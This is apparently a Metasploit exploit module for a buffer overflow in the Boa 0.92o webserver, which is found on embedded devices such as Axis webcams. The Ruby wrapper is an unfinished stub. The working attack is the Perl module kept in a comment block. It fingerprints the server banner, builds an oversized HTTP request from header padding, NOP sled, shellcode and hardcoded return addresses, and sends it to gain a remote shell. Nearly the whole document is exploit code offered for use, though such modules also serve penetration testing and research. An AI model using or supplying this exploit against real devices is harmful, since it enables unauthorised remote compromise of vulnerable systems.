require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'BOA cgi_env_add Overflow',
			'Description'    => %q{
				This module exploits an undisclosed flaw in the Boa
				webserver.  The latest release branch is not vulnerable to
				this flaw, however, there are a number of embedded devices
				that still use this vulnerable version, such as Axis
				webcams. This exploit is pretty unreliable due to the
				unpredictability of certain variables that influence the
				env_buffer's, such as PATH, hostname, and other such things.
					
			},
			'Author'         => [ 'skape', 'thief <thief@hick.org>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 140,
					'BadChars' => "\x00\x0a\x0d",
					'PrependEncoder' => "\x83\xec\x7f",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'linux',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::boa_cgi_env_add;

use strict;
use base "Msf::Exploit";
use Pex::Text;

my $advanced = 
{ 
};

my $info =
{
	'Name'           => 'BOA cgi_env_add Overflow',
	'Version'        => '$Revision$',
	'Authors'        => 
		[
			'skape <mmiller [at] hick.org>',
			'thief <thief [at] hick.org>'
		],
	'Description'    => 
		Pex::Text::Freeform(qq{
			This module exploits an undisclosed flaw in the Boa webserver.  The latest
			release branch is not vulnerable to this flaw, however, there are a number
			of embedded devices that still use this vulnerable version, such as Axis webcams.
			This exploit is pretty unreliable due to the unpredictability of certain variables
			that influence the env_buffer's, such as PATH, hostname, and other such things.
		}),
	'Arch'           => [ 'x86' ],
	'OS'             => [ 'linux' ],
	'Priv'           => 0,
	'UserOpts'       => 
		{
			'RHOST'    => [ 1, 'ADDR', 'The target proxy server address' ],
			'RPORT'    => [ 1, 'PORT', 'The target proxy server port'    ],
			'CGI'      => [ 1, 'DATA', 'The CGI path to use', '/cgi-bin/io/virtualinput.cgi' ],
		},
	'Payload'        => 
		{
			'Space'    => 140,
			'MaxNops'  => 0,
			'BadChars' => "\x00\x0a\x0d",
			'Keys'     => [ '+findsock' ],
			'PrependEncoder' => "\x83\xec\x7f", # sub $0x7f, %esp
		},
	'Refs'           => 
		[
			# 0day!
		],
	'Targets'        =>
		[
			[ 'Boa/0.92o (Linux)', 0xbffffc30, 0xbffffba0 ],
			[ 'Test',              0x41414141, 0x41414141 ],
		],
    'Keys'          => [ 'boa' ],
};

sub new
{
	my $class = shift;
	my $self;
	
	$self = $class->SUPER::new(
			{ 
				'Info'     => $info,
				'Advanced' => $advanced,
			},
			@_);

	return $self;
}

sub Check
{
	my $self = shift;
	my $code = "Safe";
	my $resp;
	my $s;
	
	$s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $self->GetVar('RHOST'), 
		'PeerPort'  => $self->GetVar('RPORT'),
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'));

	if (not defined($s))
	{
		return $self->CheckCode('Connect');
	}

	$s->Send("HEAD / HTTP/1.0\r\n\r\n");

	while (defined($resp = $s->Recv(-1, 5)))
	{
		my @lines = split /\n/, $resp;

		foreach my $line (@lines)
		{
			my ($var, $val) = split /: /, $line;

			$val =~ s/\r//;
			$val =~ s/\n//;

			if ($var eq 'Server')
			{
				$code = "Appears" if ($val eq 'Boa/0.92o');
			}
		}

		last if ($resp =~ "\r\n\r\n" or length($resp) == 0);
	}

	$s->Close();

	if ($code eq 'Appears')
	{
		$self->PrintLine("[*] This host appears to be vulnerable.");
	}
	else
	{
		$self->PrintLine("[*] This host does not appear to be vulnerable.");
	}

	return $self->CheckCode($code);
}

sub Exploit
{
	my $self = shift;
	my $targetIdx  = $self->GetVar('TARGET');
	my $payload    = $self->GetVar('EncodedPayload');
	my $shellcode  = $payload->Payload;
	my $randomText = undef;
	my $request    = undef;
	my $target     = $self->Targets->[$targetIdx];
	my $chunk      = undef;
	my $final      = undef;
	my $null       = $target->[2];
	my $ret        = $target->[1];
	my $cgi        = $self->GetVar('CGI');
	my $pad        = undef;
	my $s          = undef;

	$self->PrintLine('[*] Trying exploit target: ' . $target->[0]);

	# Build out the request
	$randomText = Pex::Text::AlphaNumText(2039);
	$pad        = ($ret - $null - 0xb) - length($shellcode);
	$chunk      = "A" x 1858 . pack("V", $null - 0x74f);
	$final      = $self->MakeNops($pad) . $shellcode . pack("V", $ret - length($shellcode));

	$request = 
		"GET $cgi HTTP/1.0\r\n" .
		"01: $randomText\r\n"   .
		"02: $randomText\r\n"   .
		"03: $randomText\r\n"   .
		"04: $randomText\r\n"   .
		"05: $randomText\r\n"   .
		"06: $randomText\r\n"   .
		"07: $randomText\r\n"   .
		"08: $chunk\r\n"        .
		"OWNED: $final\r\n"     .
		"\r\n";

	# Connect
	$s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $self->GetVar('RHOST'), 
		'PeerPort'  => $self->GetVar('RPORT'),
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'));

	if (not defined($s) or
	    $s->IsError) 
	{
		$self->PrintLine('Error creating socket: '.$s->GetError);
		return;
	}

	$s->Send($request);

	$self->Handler($s) if (defined($s));
}


1;

=end


end
end	
